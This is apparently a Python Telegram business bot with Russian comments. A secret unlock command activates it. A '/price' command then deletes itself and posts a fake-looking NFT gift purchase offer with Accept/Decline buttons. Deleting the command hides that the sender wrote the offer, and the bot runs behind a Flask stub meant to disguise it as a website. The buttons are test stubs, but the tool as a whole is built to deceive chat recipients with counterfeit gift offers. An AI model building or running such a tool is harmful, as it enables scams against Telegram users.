import re
import asyncio
import logging
import os
from threading import Thread
from flask import Flask
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- НАСТРОЙКИ ---
# Токен берется из переменных окружения Render
BOT_TOKEN = os.getenv("BOT_TOKEN")
SECRET_KEY = "/unlock_8f3k2m9x" 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

AUTHORIZED_USERS = set()

# --- ВЕБ-СЕРВЕР ДЛЯ RENDER ---
# Render требует, чтобы Web Service слушал порт. Этот блок создает видимость сайта.
app = Flask(__name__)

@app.route('/')
def index():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# --- ЛОГИКА БОТА ---
@dp.business_message(F.text == SECRET_KEY)
async def unlock_bot(message: types.Message):
    AUTHORIZED_USERS.add(message.from_user.id)
    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception:
        pass
    await bot.send_message(
        chat_id=message.chat.id,
        text="✅ Бот активирован. Теперь вы можете использовать /price.",
        business_connection_id=message.business_connection_id
    )

@dp.business_message(F.text.startswith("/price"))
async def handle_price_command(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return

    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception as e:
        logging.error(f"Не удалось удалить команду: {e}")

    pattern = r"^/price\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars)$"
    match = re.match(pattern, message.text, re.IGNORECASE)
    if not match:
        return

    nft_link, price_value, currency = match.groups()
    currency = currency.lower()

    nft_name_raw = nft_link.split('/')[-1].replace('-', '')
    nft_name_formatted = nft_name_raw.capitalize() 

    price_text = f"{price_value} ⭐" if currency == "stars" else f"{price_value} 💎"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Отклонить", callback_data="decline_offer"),
            InlineKeyboardButton(text="Принять", callback_data="accept_offer")
        ]
    ])

    final_text = (
        f"Пользователь <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a>\n"
        f"предлагает вам {price_text} за подарок\n"
        f"\"{nft_name_formatted}\".\n\n"
        f"Предложение действует еще 24h 00m.\n\n"
        f"{nft_link}"
    )

    try:
        await bot.send_message(
            chat_id=message.chat.id,
            text=final_text,
            business_connection_id=message.business_connection_id,
            reply_markup=keyboard,
            disable_web_page_preview=False
        )
    except Exception as e:
        logging.error(f"Ошибка при отправке: {e}")

@dp.callback_query(F.data == "accept_offer")
async def accept_offer(callback: types.CallbackQuery):
    await callback.answer("Вы приняли предложение! (Тестовое действие)", show_alert=True)

@dp.callback_query(F.data == "decline_offer")
async def decline_offer(callback: types.CallbackQuery):
    await callback.answer("Вы отклонили предложение. (Тестовое действие)", show_alert=True)

async def main():
    # Запускаем Flask в фоне, чтобы Render думал, что это сайт
    Thread(target=run_flask, daemon=True).start()
    print("Бот запущен. Ожидание секретного ключа...")
    await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "callback_query"])

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот остановлен.")
